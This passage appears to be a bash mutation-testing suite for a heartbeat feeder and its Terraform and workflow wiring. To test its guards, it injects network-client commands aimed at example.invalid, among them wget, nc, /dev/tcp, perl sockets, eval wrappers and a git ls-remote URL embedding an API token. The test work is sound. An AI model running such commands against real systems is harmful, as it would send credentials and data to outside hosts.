wire_red G4-2a 'tf-grace-claude_cost_capture' "$WM" "$APPLY_WF" "$TABLE_TS" "$FEEDER_SRC" "$MONITORS_TF"
w_block g4-2b UPTIME_TF claude_cost_capture 'ignore_changes = [paused]' 'ignore_changes = [period]'
wire_red G4-2b 'tf-ignore_changes-claude_cost_capture' "$WM" "$APPLY_WF" "$TABLE_TS" "$FEEDER_SRC" "$MONITORS_TF"
w_block g4-2c UPTIME_TF claude_cost_capture 'paused    = true' 'paused    = false'
wire_red G4-2c 'tf-paused-claude_cost_capture' "$WM" "$APPLY_WF" "$TABLE_TS" "$FEEDER_SRC" "$MONITORS_TF"
w_block g4-2d UPTIME_TF claude_cost_capture 'period = 3600' 'period = 1800'
wire_red G4-2d 'tf-period-claude_cost_capture' "$WM" "$APPLY_WF" "$TABLE_TS" "$FEEDER_SRC" "$MONITORS_TF"
_tg="$(grep -nE '^[[:space:]]*-target=betteruptime_heartbeat\.claude_cost_capture' "$APPLY_WF" | head -1 | cut -d: -f2-)"
w_mut g4-4 APPLY_WF "$_tg" "${_tg/claude_cost_capture/claude_cost_capture_x}"
wire_red G4-4 'apply-target-missing-claude_cost_capture' "$UPTIME_TF" "$WM" "$TABLE_TS" "$FEEDER_SRC" "$MONITORS_TF"
w_mut g4-5 TABLE_TS 'workflowFile: "scheduled-deadman-heartbeat-feeder.yml",' '// workflowFile: "scheduled-deadman-heartbeat-feeder.yml",'
wire_red G4-5 'watchdog-row-workflowFile-line' "$UPTIME_TF" "$APPLY_WF" "$WM" "$FEEDER_SRC" "$MONITORS_TF"
cases=$((cases + 1))
_none="$(printf 'resource "x" "y" {\n}\n' > "$WORK/mut/empty.tf"; wiring_violations "$WORK/mut/empty.tf" "$APPLY_WF" "$TABLE_TS" "$FEEDER_SRC" "$MONITORS_TF" 2>&1)"
if grep -qF 'no-heartbeat-blocks-discovered' <<<"$_none"; then pass "mutation row G4-6 is RED: a Terraform file with no heartbeat blocks trips the anti-vacuity pin"
else fail "mutation row G4-6: discovery of zero heartbeats was not noticed"; fi
# G4-3: drop one target from the workflow loop; G4-3 harness row: delete the loop assertion -> the mutation goes GREEN
"$PY" -I - "$WORKFLOW" "$WORK/mut/wf-droploop.yml" <<'PYL'
import sys
s = open(sys.argv[1]).read()
old = "for t in luks-monitor-host-timer claude-cost-capture; do"
assert s.count(old) == 1
open(sys.argv[2], "w").write(s.replace(old, "for t in luks-monitor-host-timer; do"))
PYL
cases=$((cases + 1))
if ! cmp -s "$WORKFLOW" "$WORK/mut/wf-droploop.yml" && grep -qx 'loop-targets-differ-from-script-table' < <(workflow_violations "$WORK/mut/wf-droploop.yml" 2>&1); then pass "mutation row G4-3 is RED: dropping a target from the workflow loop fails the loop-vs-script-table pin"
else fail "mutation row G4-3: the dropped loop target was not noticed (or did not land)"; fi
"$PY" -I - "$WORKFLOW" "$WORK/mut/wf-reorder.yml" <<'PYL'
import sys
s = open(sys.argv[1]).read()
old = "for t in luks-monitor-host-timer claude-cost-capture; do"
open(sys.argv[2], "w").write(s.replace(old, "for t in claude-cost-capture luks-monitor-host-timer; do"))
PYL
cases=$((cases + 1))
if ! cmp -s "$WORKFLOW" "$WORK/mut/wf-reorder.yml" && ! grep -q 'loop-targets' < <(workflow_violations "$WORK/mut/wf-reorder.yml" 2>&1); then pass "must-PASS (non-canonical): reordering the loop targets stays green"
else fail "must-PASS: reordering the loop targets went red (or did not land)"; fi
# (The former harness row that demanded NO other pin catch the G4-3 mutant is gone: it coupled this row to every
# unrelated pin, so adding a pin that also noticed the dropped target would have failed a correct row. The row
# above is scoped to its own violation name.)

echo "== mutation battery: review-fix guards =="
# --- feeder behaviour -------------------------------------------------------------------------------------------
# R1: the HOT arm carries its own lower bound
land r1 "remote(\$BS_TABLE) WHERE '\"\$win\"" "remote(\$BS_TABLE) WHERE dt <= now() + INTERVAL 300 SECOND'"; _m="$M"
reset_case; C_SRC="$_m"; C_ROWS="$(row hot "$((28 * H))" "$(luks_raw)" | fx r1)"; C_BEATS=1; C_APIS=1
expect_red R1 "the hot arm loses its lower dt bound: a 28 h hot row beats" 3 no_qualifying_row 0 beat
# R2: zero-padded counts
land r2a 'if [[ "$QN" != 0 ]]; then QN="${QN#"${QN%%[!0]*}"}"; fi' ':'; _m="$M"
reset_case; C_SRC="$_m"; C_STUB="zpad2"; C_ROWS="$(printf '' | fx r2a)"; C_BEATS=1; C_APIS=1
expect_red R2a "leading zeros not stripped: n:\"00\" is treated as present and beats" 3 no_qualifying_row 0 beat
land r2b '[[ -n "$QN" ]] || QN=0' ':'; _m="$M"
reset_case; C_SRC="$_m"; C_STUB="zpad3"; C_ROWS="$(printf '' | fx r2b)"; C_BEATS=1; C_APIS=1
expect_red R2b "an all-zero count left empty: n:\"000\" is treated as present and beats" 3 no_qualifying_row 0 beat
# R3: a string count must be digits only (a tab in the string used to ride past the field split)
land r3 '(if test("^[0-9]{1,18}$") then . else "bad" end)' '.'; _m="$M"
reset_case; C_SRC="$_m"; C_STUB="tabn"; C_ROWS="$(printf '' | fx r3)"; C_BEATS=1; C_APIS=1
expect_red R3 "the string-count digit test removed: n:\"5<TAB>X\" is read as 5 and beats" 3 query_failed 0 beat
# R4: an `exception` key beside a good-looking n
land r4 'has("exception") or ' ''; _m="$M"
reset_case; C_SRC="$_m"; C_STUB="exceptionn"; C_ROWS="$(printf '' | fx r4)"; C_BEATS=1; C_APIS=1
expect_red R4 "the exception guard removed: {n:3, exception:...} beats" 3 query_failed 0 beat
# R5: newest_dt=none on an empty window; R6: elapsed_ms on the markers
land r5 'if [[ "$QN" == 0 ]]; then QNEWEST="none"; fi' ':'; _m="$M"
reset_case; C_SRC="$_m"; C_ROWS="$(printf '' | fx r5)"; C_Q=3
expect_lost R5 "newest_dt=none dropped: an empty window names the epoch" 'newest_dt=none' 3 no_qualifying_row
land r6 'elapsed_ms=$(elapsed_ms)' ''; _m="$M"
reset_case; C_SRC="$_m"; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx r6)"; C_BEATS=1; C_APIS=1
expect_lost R6 "elapsed_ms dropped from the marker" 'elapsed_ms=' 0 beat
# R7: the cost withhold text
land r7a 'The cron cost-capture path, the log shipper or the Logs source may be dark; this line does not say which.' 'The checked host is dark.'; _m="$M"
reset_case; C_SRC="$_m"; C_TARGET="$T_COST"; C_ROWS="$(printf '' | fx r7a)"
expect_gained R7a "the cost withhold asserts a dark host" 'checked host is dark' 3 no_qualifying_row
land r7b 'see the cost-marker section (Querying Anthropic cost markers) of knowledge-base/engineering/operations/runbooks/betterstack-log-query.md.' 'see the runbook.'; _m="$M"
reset_case; C_SRC="$_m"; C_TARGET="$T_COST"; C_ROWS="$(printf '' | fx r7b)"
expect_lost R7b "the cost withhold loses its next-action pointer" 'cost-marker section' 3 no_qualifying_row
# R8: the secret-bearing helper stderr file is removed on every exit
land r8 'if [[ -n "$tmp_err" ]]; then rm -f -- "$tmp_err"; fi' ':'; _m="$M"
reset_case; C_SRC="$_m"; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx r8)"; C_BEATS=1; C_APIS=1
expect_residue R8 "cleanup_tmp no longer removes the helper stderr file"
# R9: pagination: a production-shaped page ({first,last,prev:null,next:null}) is NOT a further page
land r9 'or ((.pagination.next // null) != null) then "count\t"' 'or ((.pagination | length) > 0) then "count\t"'; _m="$M"
reset_case; C_SRC="$_m"; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx r9)"; C_APIS=1
expect_red R9 "any non-empty pagination object read as a further page: the real page shape fails closed" 0 beat 4 beat_failed
# ERT: the EPOCHREALTIME reads tolerate a bash that has none (`${EPOCHREALTIME-}`, not the bare expansion under set -u).
land ert1 'T0_US="${EPOCHREALTIME-}"; T0_US="${T0_US//[.,]/}"' 'T0_US="${EPOCHREALTIME//[.,]/}"'; _m="$M"
reset_case; C_SRC="$_m"; C_NOERT=1; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx ert1)"; C_BEATS=0; C_APIS=0; C_Q=0; run_case
cases=$((cases + 1))
if [[ "$LAST_RC" != 0 && "$LAST_RC" != 3 ]] && grep -q 'EPOCHREALTIME: unbound variable' "$OUT" && ! grep -q 'verdict=' "$OUT"; then pass "mutation row ERT-1 is RED: the bare T0_US read dies under set -u (status $LAST_RC, unbound variable, no verdict at all)"
else fail "mutation row ERT-1: expected a non-contract status with an unbound-variable error and no verdict, got $LAST_RC [$(markers_of)]"; fi
land ert2 '  local now="${EPOCHREALTIME-}"; now="${now//[.,]/}"' '  local now="${EPOCHREALTIME//[.,]/}"'; _m="$M"
reset_case; C_SRC="$_m"; C_NOERT=1; C_ROWS="$(row s3 "$((26 * H))" "$(luks_raw)" | fx ert2)"; C_BEATS=1; C_APIS=1
expect_lost ERT-2 "the bare per-marker read: the marker loses elapsed_ms=na (the subshell dies under set -u)" 'elapsed_ms=na( |$)' 0 beat

# R10: the caller's locale cannot widen [0-9]
land r10 'export LC_ALL=C' ':'; _m="$M"
reset_case; C_SRC="$_m"; C_STUB="arabicnewest"; C_LCALL="en_US.utf8"; C_ROWS="$(printf '' | fx r10)"; C_BEATS=1; C_APIS=1
# The mutant can only differ from the shipped feeder under a locale whose [0-9] is wider than ASCII. Without
# en_US.utf8 installed the same run cannot tell them apart and would read as a false SURVIVED, so the row is
# SKIPPED OUT LOUD instead (still one counted case, so the exact floors do not depend on the host's locales).
if (( HAVE_UTF8_LOCALE )); then
  expect_lost R10 "the LC_ALL=C export removed: Arabic-Indic digits pass the newest shape" 'newest_dt=unparsed' 0 beat
else
  cases=$((cases + 1))
  if ! grep -qiE '^en_US\.utf-?8$' <<<"$(locale -a 2>/dev/null)" || [[ "$(LC_ALL=en_US.utf8 "$BASH_BIN" -c : 2>&1)" == *"cannot change locale"* ]]; then
    printf '  SKIP: R10 needs the en_US.utf8 locale, which this host does not have; the mutant cannot be told from the shipped feeder here\n'
    pass "R10 skipped explicitly (no en_US.utf8 on this host; the locale probe agrees)"
  else fail "R10 was skipped but the locale probe disagrees: en_US.utf8 is usable"; fi
fi

# --- static pins: no second network client, HB_URL use, select_target labels ---------------------------------------
_i=0
for _payload in 'wget -q -O /dev/null example.invalid' 'nc -z example.invalid 80' 'exec 3<>/dev/tcp/example.invalid/80' "python3 -c 'import urllib.request'" 'openssl s_client -connect example.invalid:443'; do
  _i=$((_i + 1))
  land "net$_i" '  local body crc' "  local body crc
  $_payload"; _m="$M"
  static_red "NET$_i" "$_m" network-client-other-than-curl
done
# H1: the closed command set. Each payload is a way to run a program the denylist above does not name (or a way to
# hide the name); every one must trip the closed-set pin in the class that fits, and the row must have landed.
_i=0
while IFS='|' read -r -u 3 _cls _payload; do
  [[ -n "$_cls" ]] || continue
  _i=$((_i + 1))
  land "cs$_i" '  local body crc' "  local body crc
  $_payload"; _m="$M"
  case "$_cls" in
    outside) static_red "CS$_i" "$_m" command-word-outside-closed-set ;;
    indirect) static_red "CS$_i" "$_m" command-word-indirect ;;
    query) static_red "CS$_i" "$_m" query-command-word-unpinned ;;
    funcset) static_red "CS$_i" "$_m" function-set-changed ;;
    curlcount) static_red "CS$_i" "$_m" curl-command-word-count ;;
  esac
done 3<<'CSROWS'
outside|/usr/bin/wget -q example.invalid
outside|/usr/bin/env wget -q example.invalid
indirect|"wget" -q example.invalid
indirect|'wget' -q example.invalid
indirect|${W}get -q example.invalid
indirect|$(echo wget) -q example.invalid
indirect|`echo wget` -q example.invalid
outside|gh api -X POST repos/x/y/dispatches
outside|dig example.invalid
outside|host example.invalid
outside|nslookup example.invalid
outside|ping -c1 example.invalid
outside|git ls-remote https://example.invalid/$BETTERSTACK_API_TOKEN_READONLY
outside|python3 -I /dev/stdin
outside|perl -MIO::Socket::INET -e 1
outside|node -p 1
outside|aws s3 ls
outside|rsync -a x example.invalid:
outside|logger -n example.invalid x
outside|http example.invalid
outside|lynx example.invalid
outside|bash -c 'wget -q example.invalid'
outside|sh -c 'wget -q example.invalid'
outside|eval "wget -q example.invalid"
outside|exec 3<>/dev/tcp/example.invalid/80
outside|command wget -q example.invalid
outside|xargs wget
outside|true && wget -q example.invalid
outside|echo x | wget -q example.invalid
outside|: "$(wget -q example.invalid)"
outside|FOO=1 wget -q example.invalid
outside|if wget -q example.invalid; then true; fi
outside|case x in x) wget -q example.invalid ;; esac
outside|zz=$(wget -q example.invalid)
outside|[[ -n "$(wget -q example.invalid)" ]]
outside|{ wget -q example.invalid; }
query|"$QUERY" "$SQL"
funcset|nc() { true; }
curlcount|curl --disable --noproxy '*' -fsS --max-time 5 https://example.invalid
CSROWS
land hb1 '  local body crc' '  local body crc
  : "$HB_URL"'; _m="$M"
static_red HB1 "$_m" HB_URL-use-unexpected
land hb2 '  local code crc' '  local code crc
  : "$HB_URL"'; _m="$M"
static_red HB2 "$_m" HB_URL-use-unexpected
land orphan '    *) return 1 ;;' '    rogue-target)
      T="rogue-target"; W=1; NAME="x"; PRED="x" ;;
    *) return 1 ;;'; _m="$M"
static_red ORPH "$_m" select_target-labels-differ-from-TARGETS

# --- Guard 2: the emitter pins are scoped to the block that owns the fact ---------------------------------------------
sec_mut() { # <row> <src> <section-header> <old> <new> -> sets SM (path), exactly once inside that section
  local out="$WORK/mut/$1.emit"
  cases=$((cases + 1))
  if "$PY" -I - "$2" "$out" "$3" "$4" "$5" <<'PYX'
import re, sys
s = open(sys.argv[1]).read()
m = re.search(r"(?m)^\[" + re.escape(sys.argv[3]) + r"\]\n(.*?)(?=^\[|\Z)", s, re.S)
if not m or m.group(1).count(sys.argv[4]) != 1:
    sys.exit(3)
open(sys.argv[2], "w").write(s[:m.start(1)] + m.group(1).replace(sys.argv[4], sys.argv[5]) + s[m.end(1):])
PYX
  then pass "mutation row $1 landed"; SM="$out"; else fail "mutation row $1 did NOT land"; SM="$2"; fi
}
sec_drv_absent() { sec_mut CTL-SEC "$EMIT_VECTOR" transforms.tag_journald 'TEXT_NOT_IN_THE_SECTION_ZZ' x; }
own_ctl "sec_mut() fails when the edit does not land inside the section" "did NOT land" sec_drv_absent
sec_mut g2s-1 "$EMIT_VECTOR" transforms.tag_journald '.host_name = "@@HOST_NAME@@"' '.host = "@@HOST_NAME@@"'
cases=$((cases + 1))
if grep -q '^FAIL luks: host_name is written by vector.toml' < <(guard2_checks "$FEEDER_SRC" "$EMIT_LUKS" "$SM" 2>&1); then pass "mutation row G2S-1 is RED: host_name lost from [transforms.tag_journald] only (tag_metrics still has it)"
else fail "mutation row G2S-1: the scoped host_name pin did not notice"; fi
cases=$((cases + 1))
if grep -qE '^[[:space:]]*\.host_name = "@@HOST_NAME@@"' "$SM"; then pass "G2S-1 control: the old UNSCOPED pin would have survived this mutant (tag_metrics keeps the line)"
else fail "G2S-1 control: the unscoped pin would also have caught it, so the scoping proved nothing"; fi
sec_mut g2s-2 "$EMIT_VECTOR" sources.host_scripts_journald '  "luks-monitor",
' ''
cases=$((cases + 1))
if grep -q '^FAIL luks: the tag is in vector.toml' < <(guard2_checks "$FEEDER_SRC" "$EMIT_LUKS" "$SM" 2>&1); then pass "mutation row G2S-2 is RED: the luks-monitor tag lost from [sources.host_scripts_journald] only (two other sources keep it)"
else fail "mutation row G2S-2: the scoped allowlist pin did not notice"; fi
cases=$((cases + 1))
if grep -qF '"luks-monitor"' "$SM"; then pass "G2S-2 control: the old UNSCOPED pin would have survived this mutant"
else fail "G2S-2 control: the unscoped pin would also have caught it"; fi
"$PY" -I - "$EMIT_SERVER_TF" "$WORK/mut/server.hostname.tf" <<'PYX'
import sys
s = open(sys.argv[1]).read()
old = 'host_name = each.key == "web-1" ? "soleur-web-platform"'
assert s.count(old) == 1
open(sys.argv[2], "w").write(s.replace(old, 'host_name = each.key == "web-1" ? "soleur-web-platformX"'))
PYX
cases=$((cases + 1))
if ! cmp -s "$EMIT_SERVER_TF" "$WORK/mut/server.hostname.tf" && grep -q '^FAIL luks: host_name literal' < <(guard2_checks "$FEEDER_SRC" "$EMIT_LUKS" "$EMIT_VECTOR" "$WORK/mut/server.hostname.tf" 2>&1); then pass "mutation row G2S-3 is RED (landed): the server.tf host_name line changed while the server name line still carries the literal"
else fail "mutation row G2S-3: the anchored host_name pin did not notice (or the edit did not land)"; fi

# --- Guard 4: the notification route, the Sentry attributes, the apply-step scoping, a single invoker ----------------
w_block g4n-1 UPTIME_TF claude_cost_capture 'call      = false' 'call      = true'
wire_red G4N-1 'tf-call-claude_cost_capture' "$WM" "$APPLY_WF" "$TABLE_TS" "$FEEDER_SRC" "$MONITORS_TF"
w_block g4n-2 UPTIME_TF luks_monitor_host_timer 'sms       = false' 'sms       = true'
wire_red G4N-2 'tf-sms-luks_monitor_host_timer' "$WM" "$APPLY_WF" "$TABLE_TS" "$FEEDER_SRC" "$MONITORS_TF"
w_block g4n-3 UPTIME_TF claude_cost_capture 'email     = true' 'email     = false'
wire_red G4N-3 'tf-email-claude_cost_capture' "$WM" "$APPLY_WF" "$TABLE_TS" "$FEEDER_SRC" "$MONITORS_TF"
w_block g4n-4 UPTIME_TF luks_monitor_host_timer 'push      = true' 'push      = false'
wire_red G4N-4 'tf-push-luks_monitor_host_timer' "$WM" "$APPLY_WF" "$TABLE_TS" "$FEEDER_SRC" "$MONITORS_TF"
w_block g4n-5 UPTIME_TF claude_cost_capture 'team_wait = 0' 'team_wait = 5'
wire_red G4N-5 'tf-team_wait-claude_cost_capture' "$WM" "$APPLY_WF" "$TABLE_TS" "$FEEDER_SRC" "$MONITORS_TF"
w_sblock g4s-1 MONITORS_TF 'failure_issue_threshold = 1' 'failure_issue_threshold = 2'
wire_red G4S-1 'sentry-monitor-failure_issue_threshold-1' "$UPTIME_TF" "$APPLY_WF" "$TABLE_TS" "$FEEDER_SRC" "$WM"
w_sblock g4s-2 MONITORS_TF 'recovery_threshold      = 1' 'recovery_threshold      = 2'
wire_red G4S-2 'sentry-monitor-recovery_threshold-1' "$UPTIME_TF" "$APPLY_WF" "$TABLE_TS" "$FEEDER_SRC" "$WM"
w_sblock g4s-3 MONITORS_TF 'timezone                = "UTC"' 'timezone                = "Europe/Paris"'
wire_red G4S-3 'sentry-monitor-timezone-UTC' "$UPTIME_TF" "$APPLY_WF" "$TABLE_TS" "$FEEDER_SRC" "$WM"
w_sblock g4s-4 MONITORS_TF 'max_runtime_minutes     = 6' 'max_runtime_minutes     = 8'
wire_red G4S-4 'sentry-monitor-max_runtime-6' "$UPTIME_TF" "$APPLY_WF" "$TABLE_TS" "$FEEDER_SRC" "$WM"
w_mut g4a-1 APPLY_WF '              -target=terraform_data.egress_gateway_web2 2>&1' '              -target=terraform_data.egress_gateway_web2 \
              -target=betteruptime_heartbeat.claude_cost_capture 2>&1'
wire_red G4A-1 'apply-target-in-ssh-step-claude_cost_capture' "$UPTIME_TF" "$WM" "$TABLE_TS" "$FEEDER_SRC" "$MONITORS_TF"
w_mut g4a-2 APPLY_WF '              -target=terraform_data.egress_gateway_web2 2>&1' '              -target=terraform_data.egress_gateway_web2 \
              -target=logtail_exploration.luks_monitor_host_timer_dark 2>&1'
wire_red G4A-2 'apply-destroy-target-in-ssh-step' "$UPTIME_TF" "$WM" "$TABLE_TS" "$FEEDER_SRC" "$MONITORS_TF"
# The feeder script has exactly one invoker among the repo's workflows.
feeder_invokers() { # <workflows-dir> -> the number of workflow files that run the feeder script (non-comment lines)
  grep -lE '^[^#]*((bash|sh|source)[[:space:]]+[^[:space:]]*|\./[^[:space:]]*)deadman-heartbeat-feeder\.sh' "$1"/*.yml 2>/dev/null | wc -l | tr -d ' '
}
cases=$((cases + 1))
if [[ "$(feeder_invokers "$REPO/.github/workflows")" == 1 ]] && grep -qE '^[^#]*bash scripts/deadman-heartbeat-feeder\.sh' "$WORKFLOW"; then pass "the feeder script is run by exactly one workflow, the dead-man feeder workflow"
else fail "the feeder script is run by $(feeder_invokers "$REPO/.github/workflows") workflows (expected exactly the feeder workflow)"; fi
mkdir -p "$WORK/wfdir2" "$WORK/wfdir0"
cp "$WORKFLOW" "$WORK/wfdir2/scheduled-deadman-heartbeat-feeder.yml"
printf 'name: x\njobs:\n  j:\n    steps:\n      - run: bash scripts/deadman-heartbeat-feeder.sh luks-monitor-host-timer\n' > "$WORK/wfdir2/other.yml"
printf 'name: x\n# bash scripts/deadman-heartbeat-feeder.sh is only a comment here\n' > "$WORK/wfdir0/other.yml"
cases=$((cases + 1))
if [[ "$(feeder_invokers "$WORK/wfdir2")" == 2 ]]; then pass "mutation row INV-1 is RED: a second workflow that runs the feeder is counted (2)"
else fail "mutation row INV-1 SURVIVED: a second invoker was not counted"; fi
cases=$((cases + 1))
if [[ "$(feeder_invokers "$WORK/wfdir0")" == 0 ]]; then pass "mutation row INV-2 is RED: with the feeder workflow gone (a comment-only mention) the count is 0, not 1"
else fail "mutation row INV-2 SURVIVED: a comment counted as an invoker"; fi

# --- workflow structure pins -------------------------------------------------------------------------------------------
wfm() { # <row> <old> <new> <violation>: an exact-once edit of the real workflow file must trip the named pin
  local out="$WORK/mut/$1.yml"
  cases=$((cases + 1))
  if "$PY" -I - "$WORKFLOW" "$out" "$2" "$3" <<'PYX'
import sys
s = open(sys.argv[1]).read()
if s.count(sys.argv[3]) != 1:
    sys.exit(3)
open(sys.argv[2], "w").write(s.replace(sys.argv[3], sys.argv[4]))
PYX
  then
    local _wv; _wv="$(workflow_violations "$out" 2>&1)"
    if grep -qx -- "$4" <<<"$_wv"; then pass "mutation row $1 is RED as predicted: $4"
    elif [[ -z "$_wv" ]]; then fail "mutation row $1 SURVIVED: no workflow pin tripped (wanted $4)"
    else fail "mutation row $1 went red for another reason (wanted $4): [$(paste -sd, - <<<"$_wv")]"; fi
  else fail "mutation row $1 did NOT land"; fi
}
wfm_drv_absent() { wfm CTL-WFS 'TEXT_NOT_IN_THE_WORKFLOW_ZZ' x some-violation; }
wfm_drv_survivor() { wfm CTL-WFS 'timeout-minutes: 6' 'timeout-minutes: 6 ' no-such-violation; }
wfm_drv_wrongreason() { wfm CTL-WFS 'timeout-minutes: 6' 'timeout-minutes: 8' no-such-violation; }
own_ctl "wfm() fails when the edit does not land" "did NOT land" wfm_drv_absent
own_ctl "wfm() reports SURVIVED for a known survivor (a no-op edit trips no pin)" "SURVIVED: no workflow pin tripped" wfm_drv_survivor
own_ctl "wfm() reports another-reason when a DIFFERENT pin trips (timeout-minutes-not-6, not the one wanted)" "went red for another reason" wfm_drv_wrongreason
wfm WFS-1 '          strip_log_injection() {' '          curl -s https://example.invalid >/dev/null
          strip_log_injection() {' curl-in-run-block
wfm WFS-2 'sentry-ingest-domain: ${{ secrets.SENTRY_INGEST_DOMAIN }}' 'sentry-ingest-domain: ${{ secrets.SENTRY_INGEST_DOMAIN }}
          leaked-input: ${{ secrets.BETTERSTACK_QUERY_PASSWORD }}' betterstack-secret-outside-feeder-step
wfm WFS-3 'timeout-minutes: 6' 'timeout-minutes: 8' timeout-minutes-not-6
wfm WFS-4 'echo "::warning::deadman heartbeat ${t} is UNARMED (paused)"' 'echo "::warning::deadman heartbeat ${t} is UNARMED (paused): no page can fire"' unarmed-claims-no-page

# --- workflow BEHAVIOUR mutants: the same stub and the same predicate as the real row, on an edited run block ---------
own_ctl "wf_mut_red() reports SURVIVED when the predicate still holds on the run" "SURVIVED" wfmut_drv_survivor
own_ctl "wf_mut_red() reports another-reason when the mutant run block does not complete" "went red for another reason" wfmut_drv_wrongreason
WF_RUN_OVERRIDE="$(wf_mut_file wm1 'if [ "$verdict" = no_qualifying_row ]; then' 'if false; then')"; cases=$((cases + 1)); [[ -n "$WF_RUN_OVERRIDE" ]] && pass "mutation row WM-1 landed" || fail "mutation row WM-1 did NOT land"
wf_run "$STUB_LUKS_DARK"; wf_mut_red WM-1 "the no_qualifying_row branch bypassed: the real page reads FEEDER FAULT" "$(p_luks_dark; echo $?)"
WF_RUN_OVERRIDE="$(wf_mut_file wm2 'if [ "$t" = luks-monitor-host-timer ]; then' 'if true; then')"; cases=$((cases + 1)); [[ -n "$WF_RUN_OVERRIDE" ]] && pass "mutation row WM-2 landed" || fail "mutation row WM-2 did NOT land"
wf_run "$STUB_COST_DARK"; wf_mut_red WM-2 "the cost page claims HOST/SOURCE DARK" "$(p_cost_dark; echo $?)"
WF_RUN_OVERRIDE="$(wf_mut_file wm3 'reason="${BASH_REMATCH[1]}"' 'reason=""')"; cases=$((cases + 1)); [[ -n "$WF_RUN_OVERRIDE" ]] && pass "mutation row WM-3 landed" || fail "mutation row WM-3 did NOT land"
wf_run "$STUB_FAULT"; wf_mut_red WM-3 "the reason= token is no longer carried into the annotation" "$(p_fault_reason; echo $?)"
WF_RUN_OVERRIDE="$(wf_mut_file wm4 '>> "$GITHUB_STEP_SUMMARY"' '>> /dev/null')"; cases=$((cases + 1)); [[ -n "$WF_RUN_OVERRIDE" ]] && pass "mutation row WM-4 landed" || fail "mutation row WM-4 did NOT land"
wf_run "$STUB_PAUSED" "GITHUB_STEP_SUMMARY=$WORK/wf/summary.txt"; wf_mut_red WM-4 "the UNARMED line is no longer written to the step summary" "$(p_unarmed; echo $?)"
WF_RUN_OVERRIDE="$(wf_mut_file wm5 'echo "::warning::deadman heartbeat ${t} is UNARMED (paused)"' 'echo "::warning::deadman heartbeat ${t} is UNARMED (paused): no page can fire"')"; cases=$((cases + 1)); [[ -n "$WF_RUN_OVERRIDE" ]] && pass "mutation row WM-5 landed" || fail "mutation row WM-5 did NOT land"
wf_run "$STUB_PAUSED" "GITHUB_STEP_SUMMARY=$WORK/wf/summary.txt"; wf_mut_red WM-5 "the public log claims that no page can fire" "$(p_unarmed; echo $?)"
WF_RUN_OVERRIDE="$(wf_mut_file wm6 $'trap_remapped).\n            reason=""\n' $'trap_remapped).\n')"; cases=$((cases + 1)); [[ -n "$WF_RUN_OVERRIDE" ]] && pass "mutation row WM-6 landed" || fail "mutation row WM-6 did NOT land"
wf_run "$STUB_STALE"; wf_mut_red WM-6 "the per-marker reason reset removed: the earlier marker's reason rides onto trap_remapped" "$(p_stale; echo $?)"
unset WF_RUN_OVERRIDE

# The feeder's helper-stderr temp file can carry a credential-bearing error body: after every run in this suite
# (the shipped feeder and the mutants alike, each of which cleans up after itself) the private TMPDIR holds none.
cases=$((cases + 1))
if [[ "$(residue_count)" == 0 ]]; then pass "no deadman-feeder-err.* residue is left in TMPDIR after every run in this suite"
else fail "deadman-feeder-err.* residue left in TMPDIR: $(find "$WORK/tmp" -maxdepth 1 -name 'deadman-feeder-err.*' | wc -l) file(s)"; fi

echo
echo "== measured mutation verdicts (row, edit, verdicts seen, status) =="
sed 's/^/  /' "$MUT_TABLE"

# ── conservation and the floors ───────────────────────────────────────────────────────────────
echo
echo "=== $passes passed, $fails failed, $cases cases, $beat_asserts beat-call assertions ==="
if (( passes + fails != cases )); then
  printf 'FATAL: verdict conservation violated — %s+%s != %s cases.\n' "$passes" "$fails" "$cases" >&2
  exit 1
fi
# HARD-CODED floors, EXACT: each equals the measured count of this file and is compared with `!=`, so deleting a
# case AND adding one both trip it (a `<` floor lets a suite grow, or swap a deleted case for an unrelated one,
# unnoticed). A runtime-derived floor falls with the case. Changing a case means setting them to the counts printed
# on the "=== N passed ... M beat-call assertions ===" line above.
MIN_PASSES=514
MIN_BEAT_ASSERTS=117
if (( passes != MIN_PASSES )); then
  printf 'FATAL: %s passes, the exact floor is %s -- the suite was truncated or extended; a 0-failure tally proves nothing until the floor is re-derived.\n' "$passes" "$MIN_PASSES" >&2
  exit 1
fi
if (( beat_asserts != MIN_BEAT_ASSERTS )); then
  printf 'FATAL: %s beat-call assertions, the exact floor is %s.\n' "$beat_asserts" "$MIN_BEAT_ASSERTS" >&2
  exit 1
fi
(( fails == 0 )) || exit 1
echo "All $cases cases passed."
